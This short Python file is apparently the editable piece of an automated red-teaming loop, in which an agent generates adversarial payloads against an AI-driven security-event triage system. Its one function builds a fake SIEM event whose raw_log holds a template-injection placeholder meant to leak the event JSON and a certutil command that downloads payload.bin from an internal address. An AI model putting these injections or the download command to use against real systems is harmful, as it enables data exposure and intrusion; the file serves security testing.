"""
MUTABLE FILE — The agent modifies this to generate adversarial payloads.
"""


def generate_payload() -> dict:
    # Experiment 3: Template injection — {{siem_event_json}} in raw_log
    # If this survives sanitization, the template rendering would replace it
    # with the actual SIEM event JSON, causing recursive data exposure
    return {
        "task_type": "system_health_check",
        "severity": "low",
        "siem_event": {
            "title": "Routine Log Entry",
            "source_ip": "10.0.1.50",
            "username": "svc_monitor",
            "hostname": "ws-admin-01",
            "rule_name": "ServiceMonitor",
            "raw_log": (
                "EventID=4688 Process=svchost.exe User=SYSTEM "
                "CommandLine='echo {{siem_event_json}}' "
                "certutil -urlcache -split -f http://10.0.0.99/payload.bin"
            ),
        },
    }
